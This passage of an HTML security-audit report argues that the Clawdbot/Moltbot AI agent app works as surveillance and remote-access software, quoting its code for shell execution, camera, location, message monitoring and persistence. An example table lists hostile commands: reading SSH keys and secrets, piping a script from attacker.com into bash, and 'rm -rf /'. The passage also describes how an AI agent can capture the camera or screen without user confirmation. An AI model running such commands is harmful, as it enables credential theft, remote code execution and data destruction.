<span class="highlight-line">    params: { command, cwd, env, ... },</span>
<span class="highlight-line">  });</span>
}</code></pre>

      <h3>What This Enables</h3>
      <table>
        <tr>
          <th>Command Example</th>
          <th>Impact</th>
        </tr>
        <tr>
          <td><code>["cat", "/etc/passwd"]</code></td>
          <td>Read system files</td>
        </tr>
        <tr>
          <td><code>["cat", "~/.ssh/id_rsa"]</code></td>
          <td>Steal SSH private keys</td>
        </tr>
        <tr>
          <td><code>["cat", "~/.env"]</code></td>
          <td>Steal environment secrets</td>
        </tr>
        <tr>
          <td><code>["curl", "http://attacker.com/shell.sh", "|", "bash"]</code></td>
          <td>Download and execute malware</td>
        </tr>
        <tr>
          <td><code>["rm", "-rf", "/"]</code></td>
          <td>Destructive commands</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is a Remote Access Trojan (RAT) capability.</strong> Combined with the persistent daemon, any paired device can have arbitrary commands executed remotely with no user consent or notification.
      </div>

      <h3>Complete Node Command Surface</h3>
      <p>The remote execution capability extends far beyond <code>system.run</code>. The <code>node-command-policy.ts</code> file reveals the <strong>complete list of commands</strong> that can be invoked on any connected device:</p>

      <div class="file-path">src/gateway/node-command-policy.ts (lines 4-57)</div>
      <pre><code><span class="comment">// Canvas Commands</span>
<span class="keyword">const</span> CANVAS_COMMANDS = [
  <span class="string">"canvas.present"</span>, <span class="string">"canvas.hide"</span>, <span class="string">"canvas.navigate"</span>,
<span class="highlight-line">  <span class="string">"canvas.eval"</span>,  <span class="comment">// Execute arbitrary JavaScript!</span></span>
  <span class="string">"canvas.snapshot"</span>, <span class="string">"canvas.a2ui.push"</span>, ...
];

<span class="comment">// Camera Commands</span>
<span class="keyword">const</span> CAMERA_COMMANDS = [<span class="string">"camera.list"</span>, <span class="string">"camera.snap"</span>, <span class="string">"camera.clip"</span>];

<span class="comment">// Screen Commands</span>
<span class="keyword">const</span> SCREEN_COMMANDS = [<span class="string">"screen.record"</span>];

<span class="comment">// Location Commands</span>
<span class="keyword">const</span> LOCATION_COMMANDS = [<span class="string">"location.get"</span>];

<span class="comment">// SMS Commands (Android only)</span>
<span class="keyword">const</span> SMS_COMMANDS = [<span class="string">"sms.send"</span>];

<span class="comment">// System Commands</span>
<span class="keyword">const</span> SYSTEM_COMMANDS = [
<span class="highlight-line">  <span class="string">"system.run"</span>,  <span class="comment">// Arbitrary shell execution</span></span>
  <span class="string">"system.which"</span>, <span class="string">"system.notify"</span>,
  <span class="string">"system.execApprovals.get"</span>, <span class="string">"system.execApprovals.set"</span>,
<span class="highlight-line">  <span class="string">"browser.proxy"</span>,  <span class="comment">// Browser automation proxy</span></span>
];</code></pre>

      <h4>Platform Command Matrix</h4>
      <table>
        <tr>
          <th>Platform</th>
          <th>Remote Commands Available</th>
        </tr>
        <tr>
          <td><strong>macOS</strong></td>
          <td>Canvas, Camera, Screen, Location, <span class="tag tag-red">Shell Execution</span>, Browser Proxy</td>
        </tr>
        <tr>
          <td><strong>iOS</strong></td>
          <td>Canvas, Camera, Screen, Location</td>
        </tr>
        <tr>
          <td><strong>Android</strong></td>
          <td>Canvas, Camera, Screen, Location, <span class="tag tag-red">SMS Sending</span></td>
        </tr>
        <tr>
          <td><strong>Linux/Windows</strong></td>
          <td><span class="tag tag-red">Shell Execution</span>, Browser Proxy</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is not a simple automation tool.</strong> The node command surface enables: arbitrary shell command execution, camera surveillance, screen recording, GPS tracking, SMS sending, and remote JavaScript execution. This is a comprehensive remote access framework.
      </div>

      <h3>GPS Location Tracking</h3>
      <p>The same <code>nodes</code> tool also includes location tracking:</p>
      <div class="file-path">src/agents/tools/nodes-tool.ts (lines 358-386)</div>
      <pre><code><span class="keyword">case</span> <span class="string">"location_get"</span>: {
  <span class="keyword">const</span> node = <span class="function">readStringParam</span>(params, <span class="string">"node"</span>, { required: <span class="keyword">true</span> });
  <span class="keyword">const</span> nodeId = <span class="keyword">await</span> <span class="function">resolveNodeId</span>(gatewayOpts, node);
  <span class="keyword">const</span> desiredAccuracy = params.desiredAccuracy;  <span class="comment">// coarse | balanced | precise</span>

<span class="highlight-line">  <span class="keyword">const</span> raw = <span class="keyword">await</span> <span class="function">callGatewayTool</span>(<span class="string">"node.invoke"</span>, gatewayOpts, {</span>
<span class="highlight-line">    nodeId,</span>
<span class="highlight-line">    command: <span class="string">"location.get"</span>,  <span class="comment">// Gets GPS coordinates</span></span>
<span class="highlight-line">    params: { maxAgeMs, desiredAccuracy, timeoutMs },</span>
<span class="highlight-line">  });</span>
}</code></pre>

      <h3>Android Location Capture & Transmission</h3>
      <div class="file-path">apps/android/.../LocationCaptureManager.kt (lines 45-61) — JSON payload construction</div>
      <pre><code>Payload(
  buildString {
    append(<span class="string">"{\"lat\":"</span>)
    append(location.latitude)
    append(<span class="string">",\"lon\":"</span>)
    append(location.longitude)
    append(<span class="string">",\"accuracyMeters\":"</span>)
    append(location.accuracy)
<span class="highlight-line">    <span class="comment">// Also includes: altitudeMeters, speedMps, headingDeg, timestamp</span></span>
    append(<span class="string">'}'</span>)
  }
)</code></pre>

      <div class="file-path">apps/android/.../NodeRuntime.kt (line 1018) — Transmission to gateway</div>
      <pre><code><span class="keyword">val</span> payload = location.<span class="function">getLocation</span>(providers, maxAgeMs, timeoutMs, isPrecise)
<span class="highlight-line">GatewaySession.InvokeResult.<span class="function">ok</span>(payload.payloadJson)  <span class="comment">// Sent via WebSocket to gateway</span></span></code></pre>

      <h3>iOS Location Capture & Transmission — Same Pattern</h3>
      <div class="file-path">apps/ios/Sources/Model/NodeAppModel.swift (lines 612-623) — Payload construction</div>
      <pre><code><span class="keyword">let</span> payload = MoltbotLocationPayload(
    lat: location.coordinate.latitude,
    lon: location.coordinate.longitude,
    accuracyMeters: location.horizontalAccuracy,
    altitudeMeters: location.altitude,
    speedMps: location.speed,
    headingDeg: location.course,
    timestamp: ISO8601DateFormatter().<span class="function">string</span>(from: location.timestamp),
    isPrecise: isPrecise)
<span class="keyword">let</span> json = <span class="keyword">try</span> Self.<span class="function">encodePayload</span>(payload)
<span class="highlight-line"><span class="keyword">return</span> BridgeInvokeResponse(id: req.id, ok: <span class="keyword">true</span>, payloadJSON: json)</span></code></pre>

      <div class="file-path">apps/shared/MoltbotKit/.../GatewayNodeSession.swift (line 227) — WebSocket transmission</div>
      <pre><code><span class="keyword">private func</span> <span class="function">sendInvokeResult</span>(...) <span class="keyword">async</span> {
    <span class="comment">// params contains: id, nodeId, ok, payloadJSON (with lat/lon/etc)</span>
<span class="highlight-line">    <span class="keyword">try await</span> channel.<span class="function">send</span>(method: <span class="string">"node.invoke.result"</span>, params: params)</span>
}</code></pre>

      <div class="explanation">
        <strong>Cross-platform verification:</strong> Both iOS and Android use identical transmission — the <code>node.invoke.result</code> event sent over WebSocket to the gateway. The location payload (lat, lon, altitude, speed, heading, timestamp) leaves the device on both platforms.
      </div>

      <div class="warning">
        <strong>Pattern-of-Life Surveillance:</strong> Location data follows the exact same exfiltration path as camera/screen data — packaged as JSON, returned via <code>InvokeResult.ok()</code>, and transmitted over WebSocket to the gateway with no user notification. Over time, this builds a comprehensive profile of the user's movements — home address, workplace, daily routines, frequented locations, travel patterns. This is <strong>pattern-of-life analysis</strong>, a technique used in intelligence operations to understand and predict a target's behavior.
        <p style="margin-top: 12px;">Combined with camera captures, screen recordings, and message interception, this enables complete physical and digital surveillance of the target.</p>
      </div>
    </div>
  </div>

  <!-- Section 3: Message Interception -->
  <div class="section" id="messages">
    <div class="section-header">
      <span class="num">3</span>
      Message Interception (31 Platforms)
    </div>
    <div class="section-content">
      <table>
        <tr>
          <th>Platform</th>
          <th>Implementation</th>
          <th>Capability</th>
        </tr>
        <tr>
          <td>WhatsApp</td>
          <td>Baileys library</td>
          <td>Full message interception, media download</td>
        </tr>
        <tr>
          <td>iMessage/SMS</td>
          <td>BlueBubbles integration</td>
          <td>All Apple messages captured</td>
        </tr>
        <tr>
          <td>Signal</td>
          <td><code>src/signal/monitor.ts</code></td>
          <td>"Secure" messages captured</td>
        </tr>
        <tr>
          <td>Telegram</td>
          <td><code>src/telegram/monitor.ts</code></td>
          <td>Bot + message monitoring</td>
        </tr>
        <tr>
          <td>Discord/Slack</td>
          <td>Various integrations</td>
          <td>Workspace messages</td>
        </tr>
      </table>

      <h3>WhatsApp</h3>
      <div class="file-path">src/web/inbound/monitor.ts</div>
      <pre><code><span class="function">monitorWebInbox</span>({
  onMessage: (msg: WebInboundMessage) => Promise&lt;void&gt;,
  sendReadReceipts?: <span class="keyword">boolean</span>,
  mediaMaxMb?: <span class="keyword">number</span>,
})</code></pre>

      <h3>iMessage</h3>
      <div class="file-path">src/imessage/monitor/monitor-provider.ts (line 109)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorIMessageProvider</span>(
  opts: MonitorIMessageOpts = {}
): Promise&lt;<span class="keyword">void</span>&gt;</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Subscribes via <code>watch.subscribe</code> (line 471). Messages handled via <code>handleMessage()</code> (line 445).</p>

      <h3>Signal</h3>
      <div class="file-path">src/signal/monitor.ts (line 252)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorSignalProvider</span>(
  opts: MonitorSignalOpts = {}
): Promise&lt;<span class="keyword">void</span>&gt;</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Runs SSE loop (line 299) to listen for server-sent events.</p>

      <h3>Telegram</h3>
      <div class="file-path">src/telegram/monitor.ts (line 70)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorTelegramProvider</span>(
  opts: MonitorTelegramOpts = {}
)</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Long-polling mechanism for receiving Telegram updates.</p>

      <h3>BlueBubbles (iMessage/SMS bridge)</h3>
      <div class="file-path">extensions/bluebubbles/src/monitor.ts (line 2244)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">monitorBlueBubblesProvider</span>(
  options: BlueBubblesMonitorOptions,
): Promise&lt;<span class="keyword">void</span>&gt;</code></pre>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">Registers webhook target (line 2273) for incoming events.</p>

      <div class="explanation" style="margin-top: 16px;">Each platform has a dedicated monitoring function in the repository. Function signatures and line numbers verified against public source code.</div>
    </div>
  </div>

  <!-- Section 3b: Ambient Audio Listening -->
  <div class="section" id="ambient-audio">
    <div class="section-header">
      <span class="num">3b</span>
      Ambient Audio Listening — Transcript Storage (macOS)
    </div>
    <div class="section-content">
      <p>The <strong>Swabble</strong> component is an "always-on voice hook daemon" that continuously listens via microphone and <strong>stores transcripts to disk</strong>:</p>

      <div class="file-path">Swabble/Sources/SwabbleCore/Speech/SpeechPipeline.swift (lines 52-59) — Continuous mic tap</div>
      <pre><code><span class="keyword">let</span> inputNode = engine.inputNode
<span class="keyword">let</span> inputFormat = inputNode.<span class="function">outputFormat</span>(forBus: 0)
inputNode.<span class="function">removeTap</span>(onBus: 0)
<span class="highlight-line">inputNode.<span class="function">installTap</span>(onBus: 0, bufferSize: 2048, format: inputFormat) { [weak self] buffer, _ in</span>
<span class="highlight-line">    <span class="keyword">guard let</span> self <span class="keyword">else</span> { <span class="keyword">return</span> }</span>
<span class="highlight-line">    <span class="keyword">let</span> boxed = UnsafeBuffer(buffer: buffer)</span>
<span class="highlight-line">    Task { <span class="keyword">await</span> self.<span class="function">handleBuffer</span>(boxed.buffer, targetFormat: analyzerFormat) }</span>
}</code></pre>

      <div class="file-path">Swabble/README.md (line 86) — Transcripts persisted to disk</div>
      <pre><code><span class="comment">// Config default:</span>
"transcripts": {"enabled": <span class="keyword">true</span>, "maxEntries": 50}

<span class="highlight-line"><span class="comment">// Storage location:</span></span>
<span class="highlight-line">~/Library/Application Support/swabble/transcripts.log</span></code></pre>

      <div class="file-path">Swabble/docs/spec.md (line 3) — Self-described as "always-on"</div>
      <pre><code><span class="highlight-line">"brabble-style <strong>always-on voice hook</strong> for macOS 26 using Apple Speech.framework"</span></code></pre>

      <div class="warning">
        <strong>This is ambient listening with persistent storage:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Microphone continuously tapped via <code>AVAudioEngine.installTap()</code></li>
          <li>Audio transcribed via Apple Speech.framework (on-device)</li>
          <li>Transcripts <strong>stored to disk</strong> (up to 50 entries by default)</li>
          <li>Stored transcripts can be read via <code>system.run</code> and exfiltrated</li>
          <li>User may not realize their conversations are being recorded and stored</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 3c: macOS Deep System Access -->
  <div class="section" id="macos-system">
    <div class="section-header">
      <span class="num">3c</span>
      macOS Deep System Access — Accessibility & Automation
    </div>
    <div class="section-content">
      <p>The macOS app requests extensive system permissions that provide deep control over the entire system:</p>

      <h3>Accessibility API — Full UI Control</h3>
      <div class="file-path">apps/macos/Sources/Moltbot/PermissionManager.swift (lines 85-94)</div>
      <pre><code><span class="keyword">private static func</span> <span class="function">ensureAccessibility</span>(interactive: Bool) <span class="keyword">async</span> -> Bool {
<span class="highlight-line">    <span class="keyword">let</span> trusted = <span class="keyword">await</span> MainActor.run { <span class="function">AXIsProcessTrusted</span>() }</span>
    <span class="keyword">if</span> interactive, !trusted {
        <span class="keyword">await</span> MainActor.run {
            <span class="keyword">let</span> opts: NSDictionary = [<span class="string">"AXTrustedCheckOptionPrompt"</span>: <span class="keyword">true</span>]
<span class="highlight-line">            _ = <span class="function">AXIsProcessTrustedWithOptions</span>(opts)</span>
        }
    }
    <span class="keyword">return await</span> MainActor.run { <span class="function">AXIsProcessTrusted</span>() }
}</code></pre>

      <h3>AppleScript/Automation — Control Any App</h3>
      <div class="file-path">apps/macos/Sources/Moltbot/Resources/Info.plist (line 61)</div>
      <pre><code>&lt;key&gt;NSAppleEventsUsageDescription&lt;/key&gt;
<span class="highlight-line">&lt;string&gt;Moltbot needs Automation (AppleScript) permission to <strong>drive Terminal and other apps</strong> for agent actions.&lt;/string&gt;</span></code></pre>

      <div class="file-path">apps/macos/Sources/Moltbot/PermissionManager.swift (lines 381-389) — AppleScript execution</div>
      <pre><code><span class="keyword">let</span> script = <span class="string">"""
tell application "Terminal"
    return "moltbot-ok"
end tell
"""</span>

<span class="keyword">var</span> error: NSDictionary?
<span class="highlight-line"><span class="keyword">let</span> appleScript = <span class="function">NSAppleScript</span>(source: script)</span>
<span class="highlight-line"><span class="keyword">let</span> result = appleScript?.<span class="function">executeAndReturnError</span>(&error)</span></code></pre>

      <h3>All macOS Permissions Requested</h3>
      <div class="file-path">apps/macos/Sources/MoltbotIPC/IPC.swift (lines 6-12)</div>
      <pre><code><span class="keyword">public enum</span> Capability: String, Codable, CaseIterable, Sendable {
<span class="highlight-line">    <span class="keyword">case</span> appleScript      <span class="comment">// Control any app via AppleScript</span></span>
    <span class="keyword">case</span> notifications
<span class="highlight-line">    <span class="keyword">case</span> accessibility    <span class="comment">// Read/control any window via Accessibility API</span></span>
<span class="highlight-line">    <span class="keyword">case</span> screenRecording  <span class="comment">// Capture screen content</span></span>
<span class="highlight-line">    <span class="keyword">case</span> microphone       <span class="comment">// Record audio</span></span>
<span class="highlight-line">    <span class="keyword">case</span> speechRecognition <span class="comment">// Transcribe speech</span></span>
}</code></pre>

      <div class="warning">
        <strong>Accessibility + AppleScript = Total System Control:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><strong>Accessibility API</strong> can read text from any window, click any button, control any UI element</li>
          <li><strong>AppleScript</strong> can send commands to any scriptable application</li>
          <li>Combined: Can read password managers, control banking apps, access any application data</li>
          <li>These are the same permissions used by legitimate assistive tools — and by malware</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 3d: Browser Screenshots -->
  <div class="section" id="browser-screenshots">
    <div class="section-header">
      <span class="num">3d</span>
      Browser Page Screenshots — Visual Capture of Any Webpage
    </div>
    <div class="section-content">
      <p>Beyond cookies and storage, Clawdbot can take <strong>full screenshots of any webpage</strong> via Playwright/CDP:</p>

      <div class="file-path">src/browser/pw-tools-core.interactions.ts (lines 334-362)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">takeScreenshotViaPlaywright</span>(opts: {
  cdpUrl: <span class="keyword">string</span>;
  targetId?: <span class="keyword">string</span>;
  ref?: <span class="keyword">string</span>;
  element?: <span class="keyword">string</span>;
  fullPage?: <span class="keyword">boolean</span>;
  type?: <span class="string">"png"</span> | <span class="string">"jpeg"</span>;
}): Promise&lt;{ buffer: Buffer }&gt; {
  <span class="keyword">const</span> page = <span class="keyword">await</span> <span class="function">getPageForTargetId</span>(opts);
  <span class="comment">// ... element/ref selection logic ...</span>
<span class="highlight-line">  <span class="keyword">const</span> buffer = <span class="keyword">await</span> page.<span class="function">screenshot</span>({</span>
<span class="highlight-line">    type,</span>
<span class="highlight-line">    fullPage: Boolean(opts.fullPage),</span>
<span class="highlight-line">  });</span>
  <span class="keyword">return</span> { buffer };
}</code></pre>

      <div class="file-path">src/browser/cdp.ts (lines 38-70) — Direct CDP screenshot capture</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">captureScreenshot</span>(opts: {
  wsUrl: <span class="keyword">string</span>;
  fullPage?: <span class="keyword">boolean</span>;
  format?: <span class="string">"png"</span> | <span class="string">"jpeg"</span>;
  quality?: <span class="keyword">number</span>;
}): Promise&lt;Buffer&gt; {
  <span class="comment">// ...</span>
<span class="highlight-line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="function">send</span>(<span class="string">"Page.captureScreenshot"</span>, {</span>
    format,
    fromSurface: <span class="keyword">true</span>,
    captureBeyondViewport: <span class="keyword">true</span>,
  });
}</code></pre>

      <div class="warning">
        <strong>Can screenshot any page in your browser:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Banking websites with account balances</li>
          <li>Email with message content</li>
          <li>Medical portals with health information</li>
          <li>Corporate dashboards with sensitive data</li>
          <li>Password managers (if web-based like 1Password)</li>
        </ul>
        <p style="margin-top: 12px;">Screenshots can be up to 5MB (src/browser/screenshot.ts:4) and transmitted via the same WebSocket channel as other captured data.</p>
      </div>
    </div>
  </div>

  <!-- Section 3e: Local Data Hoarding -->
  <div class="section" id="local-storage">
    <div class="section-header">
      <span class="num">3e</span>
      Local Data Hoarding — Everything Stored for Later Extraction
    </div>
    <div class="section-content">
      <p>Clawdbot stores extensive data locally, all of which can be read via <code>system.run</code> and exfiltrated on demand:</p>

      <h3>Data Storage Locations</h3>
      <table>
        <tr>
          <th>Data Type</th>
          <th>Storage Path</th>
          <th>Source Reference</th>
        </tr>
        <tr>
          <td>Session transcripts</td>
          <td><code>~/.clawdbot/sessions/*.jsonl</code></td>
          <td>src/gateway/session-utils.fs.ts:50</td>
        </tr>
        <tr>
          <td>Captured media</td>
          <td><code>~/.clawdbot/media/inbound/</code></td>
          <td>src/auto-reply/reply.triggers:27</td>
        </tr>
        <tr>
          <td>Agent data</td>
          <td><code>~/.clawdbot/agents/</code></td>
          <td>Multiple test files</td>
        </tr>
        <tr>
          <td>Extensions</td>
          <td><code>~/.clawdbot/extensions/</code></td>
          <td>src/plugins/install.ts:91</td>
        </tr>
        <tr>
          <td>Voice transcripts</td>
          <td><code>~/Library/Application Support/swabble/transcripts.log</code></td>
          <td>Swabble/README.md:86</td>
        </tr>
        <tr>
          <td>VoiceWake settings</td>
          <td><code>~/.clawdbot/settings/voicewake.json</code></td>
          <td>src/gateway/server.models-voicewake-misc.e2e.test.ts:174</td>
        </tr>
      </table>

      <div class="file-path">src/auto-reply/status.ts (line 172) — Confirms transcript storage</div>
      <pre><code><span class="comment">// Transcripts are stored at the session file path</span>
<span class="highlight-line"><span class="comment">// (fallback: ~/.clawdbot/sessions/&lt;SessionId&gt;.jsonl)</span></span></code></pre>

      <h3>31 Messaging Platform Extensions</h3>
      <p>The <code>extensions/</code> directory contains dedicated integrations for 31 messaging platforms:</p>
      <div class="explanation" style="margin-top: 12px; font-family: monospace; font-size: 13px;">
        bluebubbles, copilot-proxy, diagnostics-otel, discord, google-antigravity-auth, google-gemini-cli-auth, googlechat, imessage, line, llm-task, lobster, matrix, mattermost, memory-core, memory-lancedb, msteams, nextcloud-talk, nostr, open-prose, qwen-portal-auth, signal, slack, telegram, tlon, twitch, voice-call, whatsapp, zalo, zalouser
      </div>

      <div class="warning">
        <strong>Local storage + system.run = Delayed exfiltration:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Data captured now can be exfiltrated later</li>
          <li><code>system.run</code> can <code>cat</code> any of these files</li>
          <li>Session transcripts contain full conversation history</li>
          <li>Voice transcripts contain ambient audio recordings</li>
          <li>Media directory contains captured images/video</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 3f: Remote Code Installation -->
  <div class="section" id="remote-code">
    <div class="section-header">
      <span class="num">3f</span>
      Remote Code Installation — Gateway Can Install Arbitrary Software
    </div>
    <div class="section-content">
      <p>The gateway exposes a <code>skills.install</code> method that can <strong>remotely install and execute arbitrary code</strong> on any connected device:</p>

      <div class="file-path">src/gateway/server-methods/skills.ts (lines 100-131)</div>
      <pre><code><span class="highlight-line"><span class="string">"skills.install"</span>: <span class="keyword">async</span> ({ params, respond }) => {</span>
  <span class="keyword">const</span> p = params <span class="keyword">as</span> {
    name: <span class="variable">string</span>;
    installId: <span class="variable">string</span>;
    timeoutMs?: <span class="variable">number</span>;
  };
  <span class="keyword">const</span> cfg = <span class="function">loadConfig</span>();
  <span class="keyword">const</span> workspaceDirRaw = <span class="function">resolveAgentWorkspaceDir</span>(cfg, ...);
<span class="highlight-line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="function">installSkill</span>({</span>
<span class="highlight-line">    workspaceDir: workspaceDirRaw,</span>
<span class="highlight-line">    skillName: p.name,  <span class="comment">// Arbitrary package name</span></span>
<span class="highlight-line">    installId: p.installId,</span>
<span class="highlight-line">  });</span>
}</code></pre>

      <h3>Installation Methods Supported</h3>
      <div class="file-path">src/agents/skills-install.ts (lines 84-128)</div>
      <pre><code><span class="keyword">function</span> <span class="function">buildInstallCommand</span>(spec, prefs) {
  <span class="keyword">switch</span> (spec.kind) {
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"brew"</span>: <span class="keyword">return</span> [<span class="string">"brew"</span>, <span class="string">"install"</span>, spec.formula];  <span class="comment">// macOS</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"node"</span>: <span class="keyword">return</span> [<span class="string">"npm"</span>, <span class="string">"install"</span>, <span class="string">"-g"</span>, spec.package];  <span class="comment">// npm packages</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"go"</span>:   <span class="keyword">return</span> [<span class="string">"go"</span>, <span class="string">"install"</span>, spec.module];  <span class="comment">// Go modules</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"uv"</span>:   <span class="keyword">return</span> [<span class="string">"uv"</span>, <span class="string">"tool"</span>, <span class="string">"install"</span>, spec.package];  <span class="comment">// Python</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"download"</span>: <span class="comment">// Direct file download</span></span>
  }
}</code></pre>

      <h3>Dynamic Code Loading</h3>
      <div class="file-path">src/plugins/loader.ts (lines 206-294)</div>
      <pre><code><span class="keyword">const</span> jiti = <span class="function">createJiti</span>(import.meta.url, {
  interopDefault: <span class="keyword">true</span>,
  extensions: [<span class="string">".ts"</span>, <span class="string">".tsx"</span>, <span class="string">".mts"</span>, <span class="string">".js"</span>, <span class="string">".mjs"</span>, ...],
});

<span class="comment">// Later, for each plugin:</span>
<span class="highlight-line">mod = <span class="function">jiti</span>(candidate.source) <span class="keyword">as</span> MoltbotPluginModule;  <span class="comment">// Execute arbitrary code</span></span></code></pre>

      <table>
        <tr>
          <th>Attack Vector</th>
          <th>Impact</th>
        </tr>
        <tr>
          <td>Gateway calls <code>skills.install</code></td>
          <td>Arbitrary npm/brew/go/Python package installed</td>
        </tr>
        <tr>
          <td>Package contains malicious code</td>
          <td>Code executed via <code>jiti</code> dynamic loader</td>
        </tr>
        <tr>
          <td>Compromised gateway</td>
          <td>All connected devices can have malware installed</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is a supply chain attack surface.</strong> The gateway can remotely install arbitrary packages from npm, brew, go, or Python repositories. Once installed, the code is dynamically loaded and executed via <code>jiti</code>. A compromised gateway, or a malicious package, results in arbitrary code execution on all connected devices.
      </div>
    </div>
  </div>

  <!-- Section 4: Persistence -->
  <div class="section" id="persistence">
    <div class="section-header">
      <span class="num">4</span>
      Persistent Daemon (LaunchAgent)
    </div>
    <div class="section-content">
      <p>Clawdbot installs a macOS LaunchAgent:</p>
      <pre><code>~/Library/LaunchAgents/com.clawdbot.gateway.plist</code></pre>

      <h3>LaunchAgent Configuration</h3>
      <div class="file-path">src/daemon/launchd-plist.ts (lines 74-102)</div>
      <pre><code>&lt;key&gt;RunAtLoad&lt;/key&gt;
<span class="highlight-line">&lt;true/&gt;           <span class="comment">&lt;!-- Starts on login --&gt;</span></span>
&lt;key&gt;KeepAlive&lt;/key&gt;
<span class="highlight-line">&lt;true/&gt;           <span class="comment">&lt;!-- Respawns if killed --&gt;</span></span></code></pre>

      <h3>Observed Behavior</h3>
      <pre><code>$ pkill -9 -f clawdbot
$ ps aux | grep clawdbot
<span class="comment"># Still running with NEW PIDs - it respawned instantly</span></code></pre>

      <div class="explanation">
        <strong>This means:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Clawdbot runs 24/7 whether you're using it or not</li>
          <li>It survives attempts to kill it</li>
          <li>All surveillance capabilities run continuously</li>
          <li>Users cannot easily stop it</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 5: Execution Path -->
  <div class="section" id="execution">
    <div class="section-header">
      <span class="num">5</span>
      Execution Path Analysis — "Silent" Confirmed
    </div>
    <div class="section-content">
      <h3>AI Agent Can Act Autonomously</h3>
      <p>The <code>nodes</code> tool (camera, screen recording) is:</p>
      <ul>
        <li><strong>Always included</strong> in agent toolsets — not gated by configuration</li>
        <li><strong>Enabled by default</strong> on all platforms (iOS, Android, macOS)</li>
        <li><strong>No confirmation required</strong> per-invocation — no "ask user first" wrapper</li>
        <li><strong>No rate limiting</strong> or maximum calls per session</li>
      </ul>

      <div class="file-path">src/gateway/node-command-policy.ts (lines 15-17, 32-58)</div>
      <pre><code><span class="keyword">const</span> <span class="variable">CAMERA_COMMANDS</span> = [<span class="string">"camera.list"</span>, <span class="string">"camera.snap"</span>, <span class="string">"camera.clip"</span>];
<span class="keyword">const</span> <span class="variable">SCREEN_COMMANDS</span> = [<span class="string">"screen.record"</span>];

<span class="keyword">const</span> <span class="variable">PLATFORM_DEFAULTS</span> = {
<span class="highlight-line">  ios: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
<span class="highlight-line">  android: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
<span class="highlight-line">  macos: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
<span class="highlight-line">  unknown: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
};</code></pre>

      <div class="explanation">
        <p><strong>What this means:</strong> The tool is available to the AI agent and unrestricted. Whether the agent <em>decides</em> to invoke it depends on the model and context, but there is no code preventing autonomous invocation. If the agent reasons "I should capture the screen to help the user," it can do so immediately without user confirmation.</p>
      </div>

      <h3>The <code>interactive</code> Flag — Prompts Can Be Suppressed</h3>
      <div class="file-path">PermissionManager.swift (lines 96-100)</div>
      <pre><code><span class="keyword">func</span> <span class="function">ensureScreenRecording</span>(interactive: Bool) {
<span class="highlight-line">    <span class="keyword">if</span> interactive, !granted {</span>
        <span class="comment">// prompts user</span>
    }
}</code></pre>
      <div class="warning">
        If the caller passes <code>interactive=false</code>, the macOS permission dialog is <strong>suppressed</strong>. The caller controls whether you ever see a prompt.
      </div>

      <h3>Boot → Surveillance Execution Chain</h3>
      <div class="chain">
User logs in<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
LaunchAgent loads (RunAtLoad=true)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
moltbot daemon starts<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
Auto-initializes:<br>
├── iMessage monitoring (all messages captured silently)<br>
├── WhatsApp monitoring (all messages captured silently)<br>
├── syncExternalCliCredentials() (harvests Claude/Codex/Qwen tokens)<br>
└── Gateway RPC (agent can call camera/screen anytime)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
KeepAlive=true (respawns if killed)
      </div>

      <h3>Consent Flow Summary</h3>
      <table>
        <tr>
          <th>Capability</th>
          <th>User Prompted?</th>
          <th>User Notified?</th>
          <th>Runs Automatically?</th>
        </tr>
        <tr>
          <td>Camera snap</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent decision</td>
        </tr>
        <tr>
          <td>Camera clip</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent decision</td>
        </tr>
        <tr>
          <td>Screen record</td>
          <td><span class="tag tag-yellow">CONDITIONAL*</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent decision</td>
        </tr>
        <tr>
          <td>iMessage monitor</td>
          <td><span class="tag tag-yellow">ONCE (FDA)*</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">YES — after setup</span></td>
        </tr>
        <tr>
          <td>WhatsApp monitor</td>
          <td><span class="tag tag-yellow">ONCE (QR link)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">YES — after setup</span></td>
        </tr>
